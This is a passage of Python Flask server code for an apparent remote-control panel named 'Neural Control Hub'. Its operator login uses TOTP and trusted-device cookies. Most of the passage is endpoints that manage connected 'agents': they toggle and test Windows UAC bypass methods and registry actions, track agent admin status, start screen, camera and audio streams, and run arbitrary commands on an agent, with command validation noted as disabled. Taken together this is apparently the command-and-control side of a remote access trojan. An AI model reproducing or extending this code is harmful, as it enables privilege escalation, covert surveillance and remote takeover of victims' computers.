                h = hashlib.sha256(token.encode()).hexdigest()
                lst = cfg.get('trustedDevices') or []
                trusted_ok = h in lst
        except Exception:
            trusted_ok = False
        supa_token = request.headers.get('X-Supabase-Token') or request.json.get('supabase_token')
        if SUPABASE_URL:
            # Enforce OTP when a Supabase-backed secret exists
            live = supabase_rpc_user('get_totp_secret_for_login', {}, supa_token)
            setup = None if live else supabase_rpc_user('get_totp_setup_secret', {}, supa_token)
            require_two_factor = bool(live)
            if live:
                if not otp and not trusted_ok:
                    return jsonify({'error': 'OTP required', 'requires_totp': True}), 401
                if otp:
                    secret = live if isinstance(live, str) else str(live)
                    ok = verify_totp_code(secret, str(otp), window=1)
                    if not ok:
                        record_failed_login(client_ip)
                        return jsonify({'error': 'Invalid OTP', 'requires_totp': True}), 401
            elif setup:
                # Secret exists but setup not confirmed; deny login and instruct to enroll
                return jsonify({'error': 'Two-factor not enrolled', 'requires_totp': True}), 403
            # else: no secret at all → allow password-only login (initial state)
        else:
            # Local encrypted secret path
            enc = cfg.get('totpSecretEnc')
            salt = cfg.get('totpSalt')
            require_two_factor = bool(cfg.get('totpEnabled') or cfg.get('requireTwoFactor'))
            if require_two_factor:
                if not enc or not salt:
                    return jsonify({'error': 'Two-factor not enrolled', 'requires_totp': True}), 403
                if not otp and not trusted_ok:
                    return jsonify({'error': 'OTP required', 'requires_totp': True}), 401
                if otp:
                    secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
                    if not secret:
                        return jsonify({'error': 'TOTP secret missing', 'requires_totp': True}), 403
                    ok = verify_totp_code(secret, str(otp), window=1)
                    if not ok:
                        record_failed_login(client_ip)
                        return jsonify({'error': 'Invalid OTP', 'requires_totp': True}), 401
        # Clear failed attempts on successful login
        clear_login_attempts(client_ip)
        
        # Set session
        session.permanent = True
        session['authenticated'] = True
        session['otp_verified'] = True if (require_two_factor and (otp or trusted_ok)) else False        
        session['login_time'] = datetime.datetime.now(datetime.timezone.utc).isoformat()
        session['ip'] = client_ip
        
        return jsonify({
            'success': True,
            'message': 'Login successful',
            'session_timeout': Config.SESSION_TIMEOUT
        })
    else:
        # Record failed attempt
        record_failed_login(client_ip)
        return jsonify({'error': 'Invalid password'}), 401

@app.route('/api/auth/logout', methods=['POST'])
@require_auth
def api_logout():
    """API endpoint for frontend logout"""
    session.clear()
    return jsonify({'success': True, 'message': 'Logged out successfully'})

@app.route('/api/auth/status', methods=['GET'])
def api_auth_status():
    """Check authentication status for frontend"""
    authenticated = is_authenticated()
    if authenticated:
        return jsonify({
            'authenticated': True,
            'login_time': session.get('login_time'),
            'session_timeout': Config.SESSION_TIMEOUT
        })
    else:
        return jsonify({'authenticated': False})

@app.route('/api/auth/totp/status', methods=['GET'])
def api_totp_status():
    cfg = load_settings().get('authentication', {})
    issuer = cfg.get('issuer', 'Neural Control Hub')
    supa_token = request.headers.get('X-Supabase-Token') or request.args.get('supabase_token')
    enabled = False
    verified_once = False
    enrolled = False
    if SUPABASE_URL:
      s1 = supa_token and supabase_rpc_user('get_totp_ciphertext_for_login', {}, supa_token)
      if not s1:
        s1 = supabase_rpc('get_totp_ciphertext_for_login_admin', {'user_uuid': ADMIN_USER_ID})
      if s1:
        enabled = True
        verified_once = True
        enrolled = True
      else:
        s2 = supa_token and supabase_rpc_user('get_totp_setup_ciphertext', {}, supa_token)
        if not s2:
          s2 = supabase_rpc('get_totp_setup_ciphertext_admin', {'user_uuid': ADMIN_USER_ID})
        enrolled = False
        verified_once = False
        enabled = False
    else:
      enabled = bool(cfg.get('totpEnabled'))
      verified_once = bool(cfg.get('totpVerifiedOnce'))
      enrolled = verified_once or bool(cfg.get('totpEnrolled'))
    failed = int(cfg.get('totpFailedAttempts') or 0)
    created = cfg.get('totpCreatedAt')
    return jsonify({'enabled': enabled, 'enrolled': enrolled, 'verified_once': verified_once, 'failed_attempts': failed, 'created_at': created, 'issuer': issuer})

def _parse_dict_from_client(var_name: str):
    try:
        if agent_client and hasattr(agent_client, var_name):
            d = getattr(agent_client, var_name) or {}
            return [{'key': k, 'enabled': bool(v)} for k, v in d.items()]
        path = os.path.join(os.getcwd(), 'client.py')
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        m = re.search(rf"{var_name}\s*=\s*\{{(.*?)\}}\s*", content, re.S)
        if not m:
            return []
        block = m.group(1)
        items = re.findall(r"'([^']+)'\s*:\s*(True|False)", block)
        return [{'key': k, 'enabled': v == 'True'} for k, v in items]
    except Exception:
        return []

def _parse_bypass_sequence():
    try:
        path = os.path.join(os.getcwd(), 'client.py')
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        m = re.search(r"def\s+get_bypass_methods_sequence\(\):\s*return\s*\[\s*(.*?)\s*\]", content, re.S)
        if not m:
            return []
        block = m.group(1)
        entries = re.findall(r"\{\s*'id':\s*(\d+),\s*'name':\s*'([^']+)'\s*\}", block)
        return [{'id': int(i), 'name': n} for i, n in entries]
    except Exception:
        return []

@app.route('/api/system/bypasses', methods=['GET'])
def api_system_bypasses():
    methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
    sequence = _parse_bypass_sequence()
    g_enabled = bool(getattr(agent_client, 'BYPASSES_ENABLED', False)) if agent_client else False
    return jsonify({'methods': methods, 'sequence': sequence, 'global_enabled': g_enabled})

@app.route('/api/system/registry', methods=['GET'])
def api_system_registry():
    actions = _parse_dict_from_client('REGISTRY_ACTIONS')
    g_enabled = bool(getattr(agent_client, 'REGISTRY_ENABLED', False)) if agent_client else False
    return jsonify({'actions': actions, 'global_enabled': g_enabled})

@app.route('/api/system/bypasses/test', methods=['POST'])
def api_system_bypasses_test():
    try:
        data = request.get_json(silent=True) or {}
        key = str(data.get('key') or '')
        if not key:
            return jsonify({'success': False, 'error': 'Missing key'}), 400
        if agent_client and hasattr(agent_client, 'debug_bypass_method'):
            res = agent_client.debug_bypass_method(key)
            return jsonify({'success': True, 'result': res})
        # Fallback: simulate based on parsed config
        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
        enabled = any(m['key'] == key and m['enabled'] for m in methods)
        return jsonify({'success': True, 'result': {'method': key, 'enabled': enabled, 'executed': enabled}})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/registry/test', methods=['POST'])
def api_system_registry_test():
    try:
        data = request.get_json(silent=True) or {}
        key = str(data.get('key') or '')
        agent_id = data.get('agent_id')
        if not key:
            return jsonify({'success': False, 'error': 'Missing key'}), 400
        if agent_id:
            need_admin = not bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
            enabled = bool(AGENT_OVERRIDES['registry'].get(agent_id, {}).get(key, False))
            g_enabled = bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False))
            executed = enabled and g_enabled and not need_admin
            return jsonify({'success': True, 'result': {'action': key, 'enabled': enabled, 'executed': executed, 'need_admin': need_admin}})
        if agent_client and hasattr(agent_client, 'debug_registry_action'):
            res = agent_client.debug_registry_action(key)
            return jsonify({'success': True, 'result': res})
        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
        enabled = any(a['key'] == key and a['enabled'] for a in actions)
        return jsonify({'success': True, 'result': {'action': key, 'enabled': enabled, 'executed': enabled}})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/registry/presence', methods=['POST'])
def api_system_registry_presence():
    try:
        data = request.get_json(silent=True) or {}
        key = str(data.get('key') or '')
        agent_id = data.get('agent_id')
        
        if not key:
            return jsonify({'success': False, 'error': 'Missing key'}), 400
            
        if agent_id:
             # For remote agents, we currently don't have a real-time registry check mechanism implemented here
             return jsonify({'success': True, 'result': {'present': False, 'message': 'Remote check not supported', 'path': 'Remote Agent'}})

        if agent_client and hasattr(agent_client, 'check_registry_presence'):
            res = agent_client.check_registry_presence(key)
            return jsonify({'success': True, 'result': res})
            
        return jsonify({'success': False, 'error': 'Client capability not available'}), 503
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/bypasses/toggle', methods=['POST'])
def api_system_bypasses_toggle():
    try:
        data = request.get_json(silent=True) or {}
        key = data.get('key')
        enabled = data.get('enabled')
        global_enabled = data.get('global_enabled')
        agent_id = data.get('agent_id')
        
        # Log the request for debugging
        logger.info(f"Bypass toggle request - agent_id: {agent_id}, key: {key}, enabled: {enabled}, global_enabled: {global_enabled}")
        
        # Validate input
        if not data:
            logger.warning("Empty request data for bypass toggle")
            return jsonify({'success': False, 'error': 'Missing request data'}), 400
            
        # For global operations, key and enabled can be None, but we need at least one of: key, enabled, or global_enabled
        if key is None and enabled is None and global_enabled is None:
            logger.warning("Missing parameters for bypass toggle - need at least key, enabled, or global_enabled")
            return jsonify({'success': False, 'error': 'Missing required parameters'}), 400
            
        if key is not None and not isinstance(key, str):
            logger.warning(f"Invalid key type for bypass toggle: {type(key)}")
            return jsonify({'success': False, 'error': 'Invalid key format'}), 400
            
        if enabled is not None and not isinstance(enabled, bool):
            logger.warning(f"Invalid enabled type for bypass toggle: {type(enabled)}")
            return jsonify({'success': False, 'error': 'Invalid enabled format'}), 400
            
        if agent_id and not isinstance(agent_id, str):
            logger.warning(f"Invalid agent_id type for bypass toggle: {type(agent_id)}")
            return jsonify({'success': False, 'error': 'Invalid agent_id format'}), 400
            
        if global_enabled is not None and not isinstance(global_enabled, bool):
            logger.warning(f"Invalid global_enabled type for bypass toggle: {type(global_enabled)}")
            return jsonify({'success': False, 'error': 'Invalid global_enabled format'}), 400
        
        # Apply changes to agent client if available
        if agent_client:
            if isinstance(global_enabled, bool):
                try:
                    agent_client.BYPASSES_ENABLED = global_enabled
                    agent_client.DISABLE_UAC_BYPASS = not global_enabled
                    logger.info(f"Updated global bypasses to {global_enabled} in agent client")
                except Exception as e:
                    logger.error(f"Failed to update global bypasses in agent client: {e}")
                    
            if key:
                try:
                    agent_client.UAC_BYPASS_METHODS_ENABLED[key] = enabled
                    logger.info(f"Updated bypass {key} to {enabled} in agent client")
                except Exception as e:
                    logger.error(f"Failed to update bypass {key} in agent client: {e}")
                    
        # Apply changes to agent overrides
        if agent_id:
            if isinstance(global_enabled, bool):
                AGENT_OVERRIDES['flags']['bypasses'][agent_id] = global_enabled
                logger.info(f"Updated global bypasses flag for agent {agent_id} to {global_enabled}")
            if key:
                AGENT_OVERRIDES['bypasses'].setdefault(agent_id, {})[key] = enabled
                logger.info(f"Updated bypass {key} for agent {agent_id} to {enabled}")
                
        # Get current state
        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
        g_enabled = bool(getattr(agent_client, 'BYPASSES_ENABLED', False))
        
        if agent_id:
            g_enabled = bool(AGENT_OVERRIDES['flags']['bypasses'].get(agent_id, False))
            merged = {m['key']: m['enabled'] for m in methods}
            merged.update(AGENT_OVERRIDES['bypasses'].get(agent_id, {}))
            methods = [{'key': k, 'enabled': bool(v)} for k, v in merged.items()]
            logger.info(f"Returning merged bypass state for agent {agent_id}: {len(methods)} methods, global_enabled: {g_enabled}")
        else:
            logger.info(f"Returning global bypass state: {len(methods)} methods, global_enabled: {g_enabled}")
            
        return jsonify({'success': True, 'methods': methods, 'global_enabled': g_enabled})
        
    except Exception as e:
        logger.error(f"Error in api_system_bypasses_toggle: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/api/system/registry/toggle', methods=['POST'])
def api_system_registry_toggle():
    try:
        data = request.get_json(silent=True) or {}
        key = data.get('key')
        enabled = data.get('enabled')
        global_enabled = data.get('global_enabled')
        agent_id = data.get('agent_id')
        
        # Log the request for debugging
        logger.info(f"Registry toggle request - agent_id: {agent_id}, key: {key}, enabled: {enabled}, global_enabled: {global_enabled}")
        
        # Validate input
        if not data:
            logger.warning("Empty request data for registry toggle")
            return jsonify({'success': False, 'error': 'Missing request data'}), 400
            
        # For global operations, key and enabled can be None, but we need at least one of: key, enabled, or global_enabled
        if key is None and enabled is None and global_enabled is None:
            logger.warning("Missing parameters for registry toggle - need at least key, enabled, or global_enabled")
            return jsonify({'success': False, 'error': 'Missing required parameters'}), 400
            
        if key is not None and not isinstance(key, str):
            logger.warning(f"Invalid key type for registry toggle: {type(key)}")
            return jsonify({'success': False, 'error': 'Invalid key format'}), 400
            
        if enabled is not None and not isinstance(enabled, bool):
            logger.warning(f"Invalid enabled type for registry toggle: {type(enabled)}")
            return jsonify({'success': False, 'error': 'Invalid enabled format'}), 400
            
        if agent_id and not isinstance(agent_id, str):
            logger.warning(f"Invalid agent_id type for registry toggle: {type(agent_id)}")
            return jsonify({'success': False, 'error': 'Invalid agent_id format'}), 400
            
        if global_enabled is not None and not isinstance(global_enabled, bool):
            logger.warning(f"Invalid global_enabled type for registry toggle: {type(global_enabled)}")
            return jsonify({'success': False, 'error': 'Invalid global_enabled format'}), 400
        
        # Check admin privileges for registry operations
        if agent_id:
            need_admin = not bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
            if need_admin:
                logger.warning(f"Agent {agent_id} lacks admin privileges for registry operation")
                return jsonify({'success': False, 'error': 'Admin privileges required', 'need_admin': True}), 403
        
        # Apply changes to agent client if available
        if agent_client:
            if isinstance(global_enabled, bool):
                try:
                    agent_client.REGISTRY_ENABLED = global_enabled
                    logger.info(f"Updated global registry to {global_enabled} in agent client")
                except Exception as e:
                    logger.error(f"Failed to update global registry in agent client: {e}")
                    
            if key:
                try:
                    agent_client.REGISTRY_ACTIONS[key] = enabled
                    logger.info(f"Updated registry action {key} to {enabled} in agent client")
                except Exception as e:
                    logger.error(f"Failed to update registry action {key} in agent client: {e}")
                    
        # Apply changes to agent overrides
        if agent_id:
            if isinstance(global_enabled, bool):
                AGENT_OVERRIDES['flags']['registry'][agent_id] = global_enabled
                logger.info(f"Updated global registry flag for agent {agent_id} to {global_enabled}")
            if key:
                AGENT_OVERRIDES['registry'].setdefault(agent_id, {})[key] = enabled
                logger.info(f"Updated registry action {key} for agent {agent_id} to {enabled}")
                
        # Get current state
        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
        g_enabled = bool(getattr(agent_client, 'REGISTRY_ENABLED', False))
        
        if agent_id:
            g_enabled = bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False))
            merged = {a['key']: a['enabled'] for a in actions}
            merged.update(AGENT_OVERRIDES['registry'].get(agent_id, {}))
            actions = [{'key': k, 'enabled': bool(v)} for k, v in merged.items()]
            logger.info(f"Returning merged registry state for agent {agent_id}: {len(actions)} actions, global_enabled: {g_enabled}")
        else:
            logger.info(f"Returning global registry state: {len(actions)} actions, global_enabled: {g_enabled}")
            
        return jsonify({'success': True, 'actions': actions, 'global_enabled': g_enabled})
        
    except Exception as e:
        logger.error(f"Error in api_system_registry_toggle: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/api/system/agent/status', methods=['POST'])
def api_system_agent_status():
    try:
        data = request.get_json(silent=True) or {}
        agent_id = str(data.get('agent_id') or '')
        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
        if agent_id:
            m = {m['key']: m['enabled'] for m in methods}
            a = {a['key']: a['enabled'] for a in actions}
            m.update(AGENT_OVERRIDES['bypasses'].get(agent_id, {}))
            a.update(AGENT_OVERRIDES['registry'].get(agent_id, {}))
            methods = [{'key': k, 'enabled': bool(v)} for k, v in m.items()]
            actions = [{'key': k, 'enabled': bool(v)} for k, v in a.items()]
        return jsonify({
            'success': True,
            'methods': methods,
            'actions': actions,
            'global_bypasses': bool(AGENT_OVERRIDES['flags']['bypasses'].get(agent_id, False)),
            'global_registry': bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False)),
            'admin': bool(AGENT_OVERRIDES['admin'].get(agent_id, False)),
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/agent/admin', methods=['POST'])
def api_system_agent_admin():
    try:
        data = request.get_json(silent=True) or {}
        agent_id = data.get('agent_id')
        admin_enabled = data.get('admin_enabled')
        
        # Log the request for debugging
        logger.info(f"Agent admin status update - agent_id: {agent_id}, admin_enabled: {admin_enabled}")
        
        # Validate input
        if not agent_id:
            logger.warning("Missing agent_id for admin status update")
            return jsonify({'success': False, 'error': 'Missing agent_id'}), 400
            
        if not isinstance(agent_id, str):
            logger.warning(f"Invalid agent_id type: {type(agent_id)}")
            return jsonify({'success': False, 'error': 'Invalid agent_id format'}), 400
            
        if not isinstance(admin_enabled, bool):
            logger.warning(f"Invalid admin_enabled type: {type(admin_enabled)}")
            return jsonify({'success': False, 'error': 'Invalid admin_enabled format'}), 400
        
        # Update admin status
        AGENT_OVERRIDES['admin'][agent_id] = admin_enabled
        logger.info(f"Updated admin status for agent {agent_id} to {admin_enabled}")
        
        # Clear cache for agents endpoint to ensure fresh data
        cache.delete('view//api/agents')
        logger.info(f"Cleared agents cache after admin status update")
        
        # Emit real-time update to all connected clients
        socketio.emit('agent_privilege_update', {
            'agent_id': agent_id,
            'is_admin': admin_enabled,
            'timestamp': time.time()
        })
        logger.info(f"Emitted privilege update for agent {agent_id}")
        
        return jsonify({
            'success': True,
            'agent_id': agent_id,
            'admin_enabled': admin_enabled
        })
        
    except Exception as e:
        logger.error(f"Error in api_system_agent_admin: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/api/auth/totp/enroll', methods=['POST'])
def api_totp_enroll():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    password = request.json.get('password')
    if not password:
        return jsonify({'error': 'Password is required'}), 400
    if not verify_admin_or_operator(password):
        return jsonify({'error': 'Invalid password'}), 401
    s = load_settings()
    auth = s.get('authentication', {})
    issuer = auth.get('issuer') or 'Neural Control Hub'
    supa_token = request.headers.get('X-Supabase-Token') or (request.json.get('supabase_token') if request.is_json else None)
    secret = None
    if SUPABASE_URL:
        already = supa_token and supabase_rpc_user('get_totp_ciphertext_for_login', {}, supa_token)
        if not already:
            # Fallback to admin user when JWT is missing
            already = supabase_rpc('get_totp_ciphertext_for_login_admin', {'user_uuid': ADMIN_USER_ID})
        if already:
            return jsonify({'error': 'Already enrolled'}), 403
        pre = supa_token and supabase_rpc_user('get_totp_setup_ciphertext', {}, supa_token)
        if not pre:
            pre = supabase_rpc('get_totp_setup_ciphertext_admin', {'user_uuid': ADMIN_USER_ID})
        if pre:
            try:
                b64 = pre if isinstance(pre, str) else str(pre)
                blob = base64.b64decode(b64)
                obj = json.loads(blob.decode('utf-8'))
                enc, salt = obj.get('enc'), obj.get('salt')
                secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
            except Exception:
                return jsonify({'error': 'Secret corrupted'}), 500
        else:
            secret = pyotp.random_base32()
            enc, salt = encrypt_secret(secret, Config.SECRET_KEY or 'default-key')
            payload_text = json.dumps({'enc': enc, 'salt': salt})
            payload_b64 = base64.b64encode(payload_text.encode('utf-8')).decode('utf-8')
            if supa_token:
                res = supabase_rpc_user('start_totp_setup', {'secret_cipher': payload_b64}, supa_token)
            else:
                res = supabase_rpc('start_totp_setup_admin', {'user_uuid': ADMIN_USER_ID, 'secret_cipher': payload_b64})
            if not res and res is not None:
                return jsonify({'error': 'Failed to start TOTP setup'}), 500
    else:
        enc = auth.get('totpSecretEnc')
        salt = auth.get('totpSalt')
        if not enc or not salt:
            secret = pyotp.random_base32()
            enc, salt = encrypt_secret(secret, Config.SECRET_KEY or 'default-key')
            auth['totpSecretEnc'] = enc
            auth['totpSalt'] = salt
            auth['totpCreatedAt'] = datetime.datetime.now().isoformat()
            auth['totpFailedAttempts'] = 0
            s['authentication'] = auth
            save_settings(s)
        else:
            secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
            if not secret:
                return jsonify({'error': 'Secret corrupted'}), 500
    uri = pyotp.TOTP(secret).provisioning_uri(name='operator', issuer_name=issuer)
    return jsonify({'success': True, 'secret': secret, 'uri': uri})

@app.route('/api/auth/totp/verify', methods=['POST'])
def api_totp_verify():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    otp_raw = request.json.get('otp')
    otp = re.sub(r'\D', '', str(otp_raw or ''))[:6]
    if not otp:
        return jsonify({'error': 'OTP is required'}), 400
    all_settings = load_settings()
    cfg = all_settings.get('authentication', {})
    supa_token = request.headers.get('X-Supabase-Token') or (request.json.get('supabase_token') if request.is_json else None)
    secret = None
    if SUPABASE_URL:
        live = supa_token and supabase_rpc_user('get_totp_ciphertext_for_login', {}, supa_token)
        if not live:
            live = supabase_rpc('get_totp_ciphertext_for_login_admin', {'user_uuid': ADMIN_USER_ID})
        if live:
            try:
                b64 = live if isinstance(live, str) else str(live)
                blob = base64.b64decode(b64)
                obj = json.loads(blob.decode('utf-8'))
                enc, salt = obj.get('enc'), obj.get('salt')
                secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
            except Exception:
                return jsonify({'error': 'Secret missing'}), 400
        else:
            setup = supa_token and supabase_rpc_user('get_totp_setup_ciphertext', {}, supa_token)
            if not setup:
                setup = supabase_rpc('get_totp_setup_ciphertext_admin', {'user_uuid': ADMIN_USER_ID})
            if not setup:
                return jsonify({'error': 'Two-factor not enrolled'}), 400
            try:
                b64 = setup if isinstance(setup, str) else str(setup)
                blob = base64.b64decode(b64)
                obj = json.loads(blob.decode('utf-8'))
                enc, salt = obj.get('enc'), obj.get('salt')
                secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
            except Exception:
                return jsonify({'error': 'Secret missing'}), 400
    else:
        enc = cfg.get('totpSecretEnc')
        salt = cfg.get('totpSalt')
        if not enc or not salt:
            return jsonify({'error': 'Two-factor not enrolled'}), 400
        secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
        if not secret:
            return jsonify({'error': 'Secret missing'}), 400
    ok = verify_totp_code(secret, str(otp), window=1)
    if not ok:
        return jsonify({'error': 'Invalid OTP'}), 401
    session['otp_verified'] = True
    if SUPABASE_URL:
        if supa_token:
            supabase_rpc_user('confirm_totp_setup', {}, supa_token)
        else:
            supabase_rpc('confirm_totp_setup_admin', {'user_uuid': ADMIN_USER_ID})
        return jsonify({'success': True, 'enabled': True})
    else:
        cfg['totpEnabled'] = True
        cfg['totpVerifiedOnce'] = True
        cfg['totpFailedAttempts'] = 0
        all_settings['authentication'] = cfg
        save_settings(all_settings)
        return jsonify({'success': True, 'enabled': True})

@app.route('/api/auth/totp/unlock', methods=['POST'])
def api_totp_unlock():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    password = request.json.get('password')
    if not password or not verify_admin_or_operator(password):
        return jsonify({'error': 'Invalid password'}), 401
    all_settings = load_settings()
    cfg = all_settings.get('authentication', {})
    cfg['totpFailedAttempts'] = 0
    cfg['totpLastAttemptAt'] = None
    all_settings['authentication'] = cfg
    save_settings(all_settings)
    return jsonify({'success': True})

@app.route('/api/auth/totp/reset', methods=['POST'])
def api_totp_reset():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    password = request.json.get('password')
    if not password or not verify_admin_or_operator(password):
        return jsonify({'error': 'Invalid password'}), 401
    all_settings = load_settings()
    cfg = all_settings.get('authentication', {})
    cfg.pop('totpSecretEnc', None)
    cfg.pop('totpSalt', None)
    cfg['totpEnabled'] = False
    cfg['totpVerifiedOnce'] = False
    cfg['totpFailedAttempts'] = 0
    cfg['totpCreatedAt'] = None
    all_settings['authentication'] = cfg
    save_settings(all_settings)
    return jsonify({'success': True})

@app.route('/api/auth/device/trust-status', methods=['GET'])
@require_auth
def api_trusted_device_status():
    cfg = load_settings().get('authentication', {})
    token = request.cookies.get('trusted_device')
    trusted = False
    if token:
        try:
            h = hashlib.sha256(token.encode()).hexdigest()
            trusted = h in (cfg.get('trustedDevices') or [])
        except Exception:
            trusted = False
    return jsonify({'trusted': trusted})

@app.route('/api/auth/device/trust', methods=['POST'])
@require_auth
def api_trusted_device_toggle():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    desired = bool(request.json.get('trust'))
    s = load_settings()
    auth = s.get('authentication', {})
    ssl = bool(s.get('server', {}).get('sslEnabled'))
    if desired:
        token = secrets.token_urlsafe(32)
        h = hashlib.sha256(token.encode()).hexdigest()
        lst = auth.get('trustedDevices') or []
        if h not in lst:
            lst.append(h)
            auth['trustedDevices'] = lst
            s['authentication'] = auth
            save_settings(s)
        resp = jsonify({'success': True, 'trusted': True})
        resp.set_cookie('trusted_device', token, max_age=30*24*3600, httponly=True, samesite='Lax', secure=ssl, path='/')
        return resp
    else:
        existing = request.cookies.get('trusted_device')
        if existing:
            try:
                h = hashlib.sha256(existing.encode()).hexdigest()
                lst = auth.get('trustedDevices') or []
                if h in lst:
                    lst = [x for x in lst if x != h]
                    auth['trustedDevices'] = lst
                    s['authentication'] = auth
                    save_settings(s)
            except Exception:
                pass
        resp = jsonify({'success': True, 'trusted': False})
        resp.set_cookie('trusted_device', '', max_age=0, httponly=True, samesite='Lax', secure=ssl, path='/')
        return resp

# --- NEW API ENDPOINTS FOR MODERN UI ---

# Agent Management API
@app.route('/api/agents', methods=['GET'])
@require_auth
@cache.cached(timeout=5)
def get_agents():
    """Get list of all agents with their status and performance metrics"""
    agents = []
    for agent_id, data in AGENTS_DATA.items():
        agent_info = {
            'id': agent_id,
            'name': data.get('name', f'Agent-{agent_id}'),
            'status': 'online' if data.get('sid') else 'offline',
            'platform': data.get('platform', 'Unknown'),
            'ip': data.get('ip', '0.0.0.0'),
            'last_seen': data.get('last_seen'),
            'capabilities': data.get('capabilities', ['screen', 'files', 'commands']),
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            },
            'is_admin': bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
        }
        agents.append(agent_info)
    
    return jsonify({
        'agents': agents,
        'total_count': len(agents),
        'online_count': len([a for a in agents if a['status'] == 'online'])
    })

@app.route('/api/agents/<agent_id>', methods=['GET'])
@require_auth
def get_agent_details(agent_id):
    """Get detailed information about a specific agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    data = AGENTS_DATA[agent_id]
    agent_info = {
        'id': agent_id,
        'name': data.get('name', f'Agent-{agent_id}'),
        'status': 'online' if data.get('sid') else 'offline',
        'platform': data.get('platform', 'Unknown'),
        'ip': data.get('ip', '0.0.0.0'),
        'last_seen': data.get('last_seen'),
        'capabilities': data.get('capabilities', ['screen', 'files', 'commands']),
        'performance': {
            'cpu': data.get('cpu_usage', 0),
            'memory': data.get('memory_usage', 0),
            'network': data.get('network_usage', 0)
        },
        'system_info': data.get('system_info', {}),
        'uptime': data.get('uptime', 0),
        'is_admin': bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
    }
    
    return jsonify(agent_info)

@app.route('/api/agents/<agent_id>/token/generate', methods=['POST'])
@require_auth
def generate_token_endpoint(agent_id):
    if not agent_id:
        return jsonify({'error': 'Agent ID required'}), 400
    token = generate_agent_token(agent_id)
    return jsonify({'agent_id': agent_id, 'token': token})

# Streaming Control API
@app.route('/api/agents/<agent_id>/stream/<stream_type>/start', methods=['POST'])
@require_auth
def start_stream(agent_id, stream_type):
    """Start a stream (screen, camera, or audio) for an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    if stream_type not in ['screen', 'camera', 'audio']:
        return jsonify({'error': 'Invalid stream type'}), 400
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    quality = request.json.get('quality', 'high') if request.is_json else 'high'
    
    # Emit to agent
    socketio.emit('start_stream', {
        'type': stream_type,
        'quality': quality
    }, room=agent_sid)
    
    return jsonify({
        'success': True,
        'message': f'{stream_type.title()} stream started',
        'agent_id': agent_id,
        'stream_type': stream_type,
        'quality': quality
    })

@app.route('/api/agents/<agent_id>/stream/<stream_type>/stop', methods=['POST'])
@require_auth
def stop_stream(agent_id, stream_type):
    """Stop a stream for an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    if stream_type not in ['screen', 'camera', 'audio']:
        return jsonify({'error': 'Invalid stream type'}), 400
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    # Emit to agent
    socketio.emit('stop_stream', {
        'type': stream_type
    }, room=agent_sid)
    
    return jsonify({
        'success': True,
        'message': f'{stream_type.title()} stream stopped',
        'agent_id': agent_id,
        'stream_type': stream_type
    })

# Command Execution API
@app.route('/api/agents/<agent_id>/execute', methods=['POST'])
@require_auth
def execute_command(agent_id):
    """Execute a command on an agent"""
    # Input validation
    if not agent_id or not re.match(r'^[a-zA-Z0-9\-_]+$', agent_id):
        return jsonify({'error': 'Invalid agent ID format'}), 400
    
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    command = request.json.get('command')
    if not command:
        return jsonify({'error': 'Command is required'}), 400
    
    # Validate command length and content
    command = command.strip()
    if len(command) > 1000:
        return jsonify({'error': 'Command too long (max 1000 characters)'}), 400
    # Validation disabled per user request
    
    # Generate execution ID
    execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
    
    # Emit to agent (match agent listener 'command')
    payload = {'execution_id': execution_id}
    shared_secret = os.environ.get('AGENT_SHARED_SECRET', '')
    if shared_secret:
        try:
